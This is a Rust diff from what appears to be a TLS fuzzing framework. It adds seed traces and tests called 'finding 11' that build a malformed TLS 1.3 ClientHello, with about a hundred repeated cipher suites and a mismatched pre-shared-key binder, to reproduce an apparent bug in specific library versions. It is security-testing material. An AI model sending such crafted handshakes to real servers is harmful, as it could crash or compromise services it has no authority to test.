@@ -2433,6 +2433,274 @@ pub fn seed_session_resumption_dhe_full(
     trace
 }
 
+pub fn seed_finding_11(initial_server: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
+    let mut cipher_suites = term! { fn_new_cipher_suites() };
+
+    for _ in 0..100 {
+        // 200 is too large already
+        cipher_suites = term! {
+            fn_append_cipher_suite(
+                (@cipher_suites),
+                fn_cipher_suite13_aes_256_gcm_sha384 // For 5.5.0 this MUST be a supported cipher suite
+                //fn_cipher_suite12 // Works for 5.4.0
+            )
+        };
+    }
+
+    let initial_handshake = seed_client_attacker(initial_server);
+
+    let new_ticket_message = term! {
+        fn_decrypt_application(
+            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
+            (fn_server_hello_transcript(((initial_server, 0)))),
+            (fn_server_finished_transcript(((initial_server, 0)))),
+            (fn_get_server_key_share(((initial_server, 0)))),
+            fn_no_psk,
+            fn_named_group_secp384r1,
+            fn_true,
+            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
+        )
+    };
+
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_append_cipher_suite(
+                 (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
+                fn_cipher_suite13_aes_128_gcm_sha256
+            )),
+            fn_compressions,
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            (fn_client_extensions_append(
+                                fn_client_extensions_new,
+                                // CHANGED from: (fn_client_extensions_append(
+                                // CHANGED from:     fn_client_extensions_new,
+                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
+                                // CHANGED from: )),
+                                fn_signature_algorithm_extension
+                            )),
+                            fn_supported_versions13_extension
+                        )),
+                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                    )),
+                    fn_supported_versions13_extension // CHANGED from: fn_psk_exchange_mode_dhe_ke_extension
+                )),
+                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
+                // must be last in client_hello, and initially empty until filled by fn_fill_binder
+                (fn_preshared_keys_extension_empty_binder(
+                    (fn_new_session_ticket13(
+                        fn_empty_bytes_vec,
+                        fn_empty_bytes_vec,
+                        fn_new_session_ticket_extensions_new
+                    ))
+                ))
+                // CHANGED from: (fn_preshared_keys_extension_empty_binder(
+                // CHANGED from:   (@new_ticket_message)
+                // CHANGED from: ))
+            ))
+        )
+    };
+
+    let psk = term! {
+        fn_derive_psk(
+            (fn_server_hello_transcript(((initial_server, 0)))),
+            (fn_server_finished_transcript(((initial_server, 0)))),
+            (fn_client_finished_transcript(((initial_server, 0)))),
+            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
+            (fn_get_ticket_nonce((@new_ticket_message))),
+            fn_named_group_secp384r1
+        )
+    };
+
+    let initial_client_hello = match &initial_handshake.steps[0].action {
+        Action::Input(action) => Some(action.recipe.clone()),
+        Action::Output(_) => None,
+    }
+    .unwrap();
+
+    let binder = term! {
+        fn_derive_binder(
+            (@initial_client_hello), // CHANGED: (@client_hello),
+            (@psk)
+        )
+    };
+
+    let full_client_hello = term! {
+        fn_fill_binder(
+            (@client_hello),
+            (@binder)
+        )
+    };
+
+    let trace = Trace {
+        prior_traces: vec![initial_handshake],
+        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        @full_client_hello
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        @full_client_hello
+                    },
+                }),
+            },
+        ],
+    };
+
+    trace
+}
+
+pub fn seed_finding_11_full(
+    initial_server: AgentName,
+    server: AgentName,
+) -> Trace<TlsQueryMatcher> {
+    let (
+        initial_handshake,
+        server_hello_transcript,
+        server_finished_transcript,
+        client_finished_transcript,
+    ) = _seed_client_attacker_full(initial_server);
+
+    let new_ticket_message = term! {
+        fn_decrypt_application(
+            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket?
+            (@server_hello_transcript),
+            (@server_finished_transcript),
+            (fn_get_server_key_share(((initial_server, 0)))),
+            fn_no_psk,
+            fn_named_group_secp384r1,
+            fn_true,
+            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
+        )
+    };
+
+    let mut cipher_suites = term! { fn_new_cipher_suites() };
+
+    for _ in 0..100 {
+        // 200 is too large already
+        cipher_suites = term! {
+            fn_append_cipher_suite(
+                (@cipher_suites),
+                fn_cipher_suite13_aes_256_gcm_sha384 // For 5.5.0 this MUST be a supported cipher suite
+                //fn_cipher_suite12 // Works for 5.4.0
+            )
+        };
+    }
+
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_append_cipher_suite(
+                 (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
+                fn_cipher_suite13_aes_128_gcm_sha256
+            )),
+            fn_compressions,
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            (fn_client_extensions_append(
+                                fn_client_extensions_new,
+                                // CHANGED from: (fn_client_extensions_append(
+                                // CHANGED from:     fn_client_extensions_new,
+                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
+                                // CHANGED from: )),
+                                fn_signature_algorithm_extension
+                            )),
+                            fn_supported_versions13_extension
+                        )),
+                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                    )),
+                    fn_supported_versions13_extension // CHANGED from: fn_psk_exchange_mode_dhe_ke_extension
+                )),
+                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
+                // must be last in client_hello, and initially empty until filled by fn_fill_binder
+                (fn_preshared_keys_extension_empty_binder(
+                    (fn_new_session_ticket13(
+                        fn_empty_bytes_vec,
+                        fn_empty_bytes_vec,
+                        fn_new_session_ticket_extensions_new
+                    ))
+                ))
+                // CHANGED from: (fn_preshared_keys_extension_empty_binder(
+                // CHANGED from:   (@new_ticket_message)
+                // CHANGED from: ))
+            ))
+        )
+    };
+
+    let psk = term! {
+        fn_derive_psk(
+            (@server_hello_transcript),
+            (@server_finished_transcript),
+            (@client_finished_transcript),
+            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
+            (fn_get_ticket_nonce((@new_ticket_message))),
+            fn_named_group_secp384r1
+        )
+    };
+
+    let initial_client_hello = match &initial_handshake.steps[0].action {
+        Action::Input(action) => Some(action.recipe.clone()),
+        Action::Output(_) => None,
+    }
+    .unwrap();
+
+    let binder = term! {
+        fn_derive_binder(
+            (@initial_client_hello), // CHANGED: (@client_hello),
+            (@psk)
+        )
+    };
+
+    let full_client_hello = term! {
+        fn_fill_binder(
+            (@client_hello),
+            (@binder)
+        )
+    };
+
+    let trace = Trace {
+        prior_traces: vec![initial_handshake],
+        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        @full_client_hello
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        @full_client_hello
+                    },
+                }),
+            },
+        ],
+    };
+
+    trace
+}
+
 macro_rules! corpus {
     ( $( $func:ident $(: $meta:meta)* ),* ) => {
         {
@@ -2630,6 +2898,20 @@ pub mod tests {
     #[test]
     fn test_seed_session_resumption_dhe_full() {
         let ctx = seed_session_resumption_dhe_full.execute_trace();
+        assert!(ctx.agents_successful());
+    }
+
+    #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
+    #[test]
+    fn test_seed_finding_11() {
+        let ctx = seed_finding_11.execute_trace();
+        assert!(ctx.agents_successful());
+    }
+
+    #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
+    #[test]
+    fn test_seed_finding_11_full() {
+        let ctx = seed_finding_11_full.execute_trace();
         assert!(ctx.agents_successful());
     }
 
